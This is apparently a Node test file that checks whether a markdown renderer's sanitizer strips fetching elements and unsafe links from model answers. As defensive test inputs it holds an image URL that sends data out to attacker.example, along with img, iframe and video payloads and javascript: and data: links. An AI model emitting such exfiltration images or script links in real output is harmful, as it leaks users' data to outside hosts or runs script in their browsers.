// node --test (needs this app's node_modules): what a model answer renders, as the HAST
// MarkdownRenderer builds (remark-gfm, rehype-raw, then rehype-sanitize with our schema).
import { test } from "node:test";
import assert from "node:assert/strict";
import { unified } from "unified";
import remarkParse from "remark-parse";
import remarkGfm from "remark-gfm";
import remarkRehype from "remark-rehype";
import rehypeRaw from "rehype-raw";
import rehypeSanitize from "rehype-sanitize";
import { MARKDOWN_SCHEMA } from "../src/utils/markdownSchema.js";

const render = async (markdown) => {
  const pipeline = unified()
    .use(remarkParse)
    .use(remarkGfm)
    .use(remarkRehype, { allowDangerousHtml: true })
    .use(rehypeRaw)
    .use(rehypeSanitize, MARKDOWN_SCHEMA);
  return pipeline.run(pipeline.parse(markdown));
};
const elements = (node, out = []) => {
  if (node.type === "element") out.push(node);
  (node.children || []).forEach((child) => elements(child, out));
  return out;
};
const FETCHING = ["src", "srcSet", "poster", "background", "data", "formAction", "action"];

test("a markdown or raw-HTML image to an external URL renders no element that fetches", async () => {
  const tree = await render(
    "Top POP: fra-1\n\n![](https://attacker.example/?d=SECRET-QUERY-DATA)\n\n" +
      '<img src="https://attacker.example/x.png"><picture><source srcset="https://attacker.example/y"></picture>' +
      '<video poster="https://attacker.example/p"></video><iframe src="https://attacker.example/"></iframe>',
  );
  const all = elements(tree);
  assert.deepEqual(all.filter((e) => ["img", "picture", "source", "video", "iframe"].includes(e.tagName)), []);
  for (const element of all) {
    for (const name of FETCHING) {
      assert.equal(element.properties?.[name], undefined, `${element.tagName}.${name}`);
    }
  }
  assert.equal(JSON.stringify(tree).includes("attacker.example"), false);
});

test("links keep only http and https targets", async () => {
  const tree = await render(
    "[ok](https://example.com/report) [plain](http://example.com) [js](javascript:alert(1)) " +
      "[data](data:text/html;base64,PHNjcmlwdD4=) [mail](mailto:ops@example.com)\n\n" +
      '<a href="javascript:alert(2)">raw js</a> <a href="data:text/html,x">raw data</a>',
  );
  const hrefs = elements(tree).filter((e) => e.tagName === "a").map((e) => e.properties.href);
  assert.deepEqual(hrefs, ["https://example.com/report", "http://example.com", undefined, undefined, undefined, undefined, undefined]);
});

test("text and tables still render", async () => {
  const tree = await render("**Cache hit rate** by POP:\n\n| POP | Hit % |\n|---|---|\n| fra-1 | 94.1 |\n");
  const tags = elements(tree).map((e) => e.tagName);
  for (const tag of ["strong", "table", "thead", "tbody", "tr", "th", "td"]) {
    assert.ok(tags.includes(tag), tag);
  }
});
